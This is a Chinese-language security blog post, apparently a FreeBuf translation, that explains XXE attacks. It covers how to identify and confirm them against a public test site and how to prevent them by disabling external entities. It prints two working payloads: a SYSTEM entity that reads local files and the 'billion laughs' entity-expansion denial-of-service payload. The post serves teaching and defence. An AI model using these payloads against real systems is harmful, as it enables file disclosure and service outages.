---
layout: post
title: 浅谈XXE攻击
categories:
- Pocket
tags:
---
原文地址：http://mp.weixin.qq.com/s/io2qyYIsGR3IqXgxWJu3Uw

收藏时间：2017-02-21 11:39:40

<div  lang="zh">
                <div id="img-content" class="rich_media_area_primary" nodeIndex="6">
                    
                    <p class="profile_meta _RIL_KEEPER_CLASS_" nodeIndex="11">
                                <label class="profile_meta_label">微信号</label>
                                <span class="profile_meta_value">freebuf</span>
                                </p><p class="profile_meta _RIL_KEEPER_CLASS_" nodeIndex="12">
                                <label class="profile_meta_label">功能介绍</label>
                                <span class="profile_meta_value">国内关注度最高的全球互联网安全新媒体</span>
                                </p>
                    
                    
                    
                    
                                                            
                                                            
                    
                    <div class="rich_media_content " id="js_content" nodeIndex="13">
                        

                        
                        
                        <h2 nodeIndex="14"><strong nodeIndex="112"><span nodeIndex="113">0×00. 介绍</span></strong><br nodeIndex="114"></h2><blockquote nodeIndex="15"><p class=" _RIL_KEEPER_CLASS_" nodeIndex="16">现在越来越多主要的web程序被发现和报告存在XXE(XML External Entity attack)漏洞，比如说facebook、paypal等等。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="17">举个例子，我们扫一眼这些网站最近奖励的漏洞，充分证实了前面的说法。尽管XXE漏洞已经存在了很多年，但是它从来没有获得它应得的关注度。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="18">很多XML的解析器默认是含有XXE漏洞的，这意味着开发人员有责任确保这些程序不受此漏洞的影响。 </p></blockquote><p class=" _RIL_KEEPER_CLASS_" nodeIndex="19"><span nodeIndex="115">本文主要讨论什么是XML外部实体，这些外部实体是如何被攻击的。</span></p><h2 nodeIndex="20"><span nodeIndex="116">0×01. 什么是XML外部实体？</span></h2><p class=" _RIL_KEEPER_CLASS_" nodeIndex="21">如果你了解XML，你可以把XML理解为一个用来定义数据的东东。因此，两个采用不同技术的系统可以通过XML进行通信和交换数据。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="22">比如，下图就是一个用来描述一个职工的XML文档样本，其中的’name’,'salary’,'address’ 被称为XML的元素。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="23"><div id="RIL_IMG_1" class="RIL_IMG"><img src="/media/posts_images/2017-02-21-1619643890/1"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="24"><span nodeIndex="117">有些XML文档包含system标识符定义的“实体”，这些XML文档会在DOCTYPE头部标签中呈现。</span>这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="25"><div id="RIL_IMG_2" class="RIL_IMG"><img src="/media/posts_images/2017-02-21-1619643890/2"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="26">在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="27">关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取。因此，XML实体被使用的次数越多，越有帮助。</p><h2 nodeIndex="28"><span nodeIndex="118">0×02. 什么是XML外部实体攻击？</span></h2><p class=" _RIL_KEEPER_CLASS_" nodeIndex="29">有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="30">简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。比如，下面的代码将获取系统上folder/file的内容并呈献给用户。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="31"><div id="RIL_IMG_3" class="RIL_IMG"><img src="/media/posts_images/2017-02-21-1619643890/3"/></div></p><h2 nodeIndex="32"><span nodeIndex="119">0×03. 怎么甄别一个XML实体攻击漏洞？</span></h2><p class=" _RIL_KEEPER_CLASS_" nodeIndex="33">最直接的回答就是： 甄别那些接受XML作为输入内容的端点。 但是有时候，这些端点可能并不是那么明显(比如，一些仅使用JSON去访问服务的客户端)。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="34">在这种情况下，渗透测试人员就必须尝试不同的测试方式，比如修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。</p><h2 nodeIndex="35"><span nodeIndex="120">0×04. 如何确认XXE漏洞？</span></h2><p class=" _RIL_KEEPER_CLASS_" nodeIndex="36">出于演示的目的，我们将用到一个Acunetix维护的demo站点，这个站点就是: http://testhtml5.vulnweb.com/。这个站点可用于测试Acunetix web扫描器的功能。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="37">访问 http://testhtml5.vulnweb.com/ 站点，点击 ‘Login’下面的 ‘Forgot Password’    链接。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="38">注意观察应用程序怎样使用XML传输数据，过程如下图所示：</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="39">请求：</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="40"><div id="RIL_IMG_4" class="RIL_IMG"><img src="/media/posts_images/2017-02-21-1619643890/4"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="41">响应：</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="42"><div id="RIL_IMG_5" class="RIL_IMG"><img src="/media/posts_images/2017-02-21-1619643890/5"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="43">观察上面的请求与响应，我们可以看到，应用程序正在解析XML内容，接受特定的输入，然后将其呈现给用户。为了测试验证XML解析器确实正在解析和执行我们自定义的XML内容，我们发送如下的请求</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="44">修改后的请求和响应：</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="45"><div id="RIL_IMG_6" class="RIL_IMG"><img src="/media/posts_images/2017-02-21-1619643890/6"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="46">如上图所示，我们在上面的请求中定义了一个名为myentity、值为’testing’的实体。 响应报文清晰地展示了解析器已经解析了我们发送的XML实体，然后并将实体内容呈现出来了。 由此，我们可以确认，这个应用程序存在XXE漏洞。</p><h2 nodeIndex="47"><span nodeIndex="121">0×05. 如何进行XXE攻击？</span></h2><blockquote nodeIndex="48"><pre nodeIndex="49"><code class="hljs dts" nodeIndex="51"><p class=" _RIL_KEEPER_CLASS_" nodeIndex="50"><span nodeIndex="122">Code 1:</span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="52">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="53"><span nodeIndex="123">1. To read files on same server:</span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="54">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="55"><span nodeIndex="124"><?xml version="1.0" encoding="ISO-8859-1"?></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="56">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="57"><span nodeIndex="125"><!DOCTYPE foo [ </span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="58">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="59"><span nodeIndex="126">	 <!ENTITY myentity SYSTEM "file:///location/anyfile" >]></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="60">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="61"><span nodeIndex="127"><abc>&myentity;</abc></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="62">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="63"><span nodeIndex="128">2. To crash the server / Cause denial of service:</span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="64">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="65"><span nodeIndex="129"><?xml version="1.0"?></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="66">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="67"><span nodeIndex="130"><!DOCTYPE lolz [</span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="68">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="69"><span nodeIndex="131">	 <!ENTITY lol "lol"></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="70">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="71"><span nodeIndex="132"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="72">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="73"><span nodeIndex="133"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="74">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="75"><span nodeIndex="134"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="76">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="77"><span nodeIndex="135"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="78">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="79"><span nodeIndex="136"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="80">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="81"><span nodeIndex="137"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="82">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="83"><span nodeIndex="138"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="84">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="85"><span nodeIndex="139"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="86">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="87"><span nodeIndex="140">	]></span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="88">	</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="89"><span nodeIndex="141"><lolz>&lol9;</lolz></span></p></code></pre></blockquote><p class=" _RIL_KEEPER_CLASS_" nodeIndex="90">上面样例代码1中的XXE漏洞攻击就是著名的’billion laughs’(https://en.wikipedia.org/wiki/Billion_laughs)攻击，该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”Ha！”字符串，从而导致 DDoS 攻击。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="91">原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="92">除了这些，攻击者还可以读取服务器上的敏感数据，还能通过端口扫描，获取后端系统的开放端口。</p><h2 nodeIndex="93"><span nodeIndex="142">影响:</span></h2><p class=" _RIL_KEEPER_CLASS_" nodeIndex="94">此漏洞非常危险, 因为此漏洞会造成服务器上敏感数据的泄露，和潜在的服务器拒绝服务攻击。</p><h2 nodeIndex="95"><span nodeIndex="143">补救措施：</span></h2><p class=" _RIL_KEEPER_CLASS_" nodeIndex="96">上面讨论的主要问题就是XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="97">因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="98">比如下面的Java代码，通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。 点击阅读原文查看代码的第二段。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="99"><span nodeIndex="144">*参考来源：</span><span nodeIndex="145">resources</span><span nodeIndex="146">, 译者：wenjian_tk0，转载请注明来自FreeBuf</span></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="100"><div id="RIL_IMG_7" class="RIL_IMG"><img src="/media/posts_images/2017-02-21-1619643890/7"/></div></p>
                    </div>
                    </div></div>